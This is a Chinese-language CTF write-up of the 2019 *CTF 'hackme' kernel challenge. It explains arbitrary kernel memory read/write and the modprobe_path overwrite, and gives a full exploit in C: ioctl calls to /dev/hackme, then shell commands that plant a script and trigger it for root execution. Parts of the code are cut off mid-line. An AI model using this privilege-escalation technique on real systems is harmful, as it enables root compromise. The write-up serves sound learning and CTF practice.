# 简介
RW Any Memory的全称是Read and write any memory,
就是内存任意读写;通常这种类型的漏洞是由于越界读写或者错误引用了指针操作造成可以修改控制某个区域里面的指针,导致我们可以改变程序的常规读写区域甚至程序执行流程....  
这里我是利用2019
STARCTF里面的hackeme来演示和学习这种漏洞的利用,其中环境和题目我放在[github](https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme)上面了.需要的话可以自行下载学习....
# 前置知识
## modprobe_path
modprobe_path指向了一个内核在运行未知文件类型时运行的二进制文件;当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件去，如果我们将这个字符串指向我们的自己的二进制文件,那么在发生错误的时候就可以执行我们自己二进制文件了....  
这里modprobe_path的地址可以通过cat直接查看到:
    cat /proc/kallsyms | grep modprobe_path
原理代码如下,其实就是调用了`call_usermodehelper`函数:
    int __request_module(bool wait, const char *fmt, ...) 
    { 
        va_list args; 
        char module_name[MODULE_NAME_LEN]; 
        unsigned int max_modprobes; 
        int ret; 
    // char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"; 
        char *argv[] = { modprobe_path, "-q", "--", module_name, NULL }; 
        static char *envp[] = { "HOME=/", 
                    "TERM=linux", 
                    "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
                    NULL }; // 环境变量. 
        static atomic_t kmod_concurrent = ATOMIC_INIT(0); 
    #define MAX_KMOD_CONCURRENT 50    /* Completely arbitrary value - KAO */ 
        static int kmod_loop_msg; 
        va_start(args, fmt); 
        ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   
        va_end(args); 
        if (ret >= MODULE_NAME_LEN) 
            return -ENAMETOOLONG; 
        max_modprobes = min(max_threads/2, MAX_KMOD_CONCURRENT);    
        atomic_inc(&kmod_concurrent); 
        if (atomic_read(&kmod_concurrent) > max_modprobes) { 
            /* We may be blaming an innocent here, but unlikely */ 
            if (kmod_loop_msg++  /home/pwn/copy.sh");
        system("chmod +x /home/pwn/copy.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
        system("chmod +x /home/pwn/sir");
需要注意的是`system`里面的命令要程序的全路径，而不能是相对路径,`cp`命令要写成`/bin/cp`;  
而修改`modprobe_path`内容的方法和泄露模块地址等用到的方法是一样的....
# exp
exp.c:
    #include
    #include
    #include
    struct heap{
        size_t id;
        size_t *data;
        size_t len;
        size_t offset;
    };
    int fd;
    void alloc(int id, char *data, size_t len){
        struct heap h;
        h.id = id;
        h.data = data;
        h.len = len;
        ioctl(fd,0x30000,&h);
    }
    void delete(int id){
        struct heap h;
        h.id = id;
        ioctl(fd,0x30001,&h);
    }
    void cin_kernel(int id, char *data, size_t len, size_t offset){
        struct heap h;
        h.id = id;
        h.data = data;
        h.len = len;
        h.offset = offset;
        ioctl(fd,0x30002,&h);
    }
    void cout_kernel(int id, char *data, size_t len, size_t offset){
        struct heap h;
        h.id = id;
        h.data = data;
        h.len = len;
        h.offset = offset;
        ioctl(fd,0x30003,&h);
    }
    int main(){
        fd = open("/dev/hackme",0);
        size_t heap_addr,kernel_addr,mod_tree_addr,ko_addr,pool_addr;
        char *mem = malloc(0x1000);
        if(fd  /home/pwn/copy.sh");
        system("chmod +x /home/pwn/copy.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
        system("chmod +x /home/pwn/sir");
        system("/home/pwn/sir");
        system("cat /home/pwn/flag");
        return 0;
    }
编译:
    gcc exp.c -o exp -w -static
运行:  
# 总结
我不知道利用这种方法可不可以返回一个`shell`回来,我试过直接将`modprobe_path`改为`/bin/sh`去执行,但是不可以;不知道改为反弹shell会不会成功,因为我的环境运行有点问题,所以就没有测试,希望知道的师傅可以说一下....